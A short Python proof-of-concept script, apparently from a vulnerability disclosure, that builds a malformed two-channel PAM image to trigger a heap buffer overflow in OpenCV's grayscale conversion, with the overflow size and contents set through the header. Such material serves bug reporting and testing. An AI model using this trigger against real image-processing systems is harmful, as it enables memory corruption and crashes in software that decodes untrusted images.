#!/usr/bin/env python3
"""Builds poc.pam: a PAM image declaring DEPTH 2 / TUPLTYPE GRAYSCALE_ALPHA.

Read with IMREAD_GRAYSCALE, OpenCV converts 2 channels down to 1. The 4.13.0
converter advances the destination by 3 bytes per source pixel while the
destination row holds only WIDTH bytes, so it writes ~1.5x the row length.
WIDTH and HEIGHT come from the header, so both the overflow length and the
bytes written are attacker controlled.
"""
W, H = 512, 2
hdr = (f"P7\nWIDTH {W}\nHEIGHT {H}\nDEPTH 2\nMAXVAL 255\n"
       f"TUPLTYPE GRAYSCALE_ALPHA\nENDHDR\n").encode()
body = bytes((i * 7) & 0xff for i in range(W * H * 2))
open("poc.pam", "wb").write(hdr + body)
print(f"poc.pam: {len(hdr) + len(body)} bytes ({W}x{H}, 2 channels)")
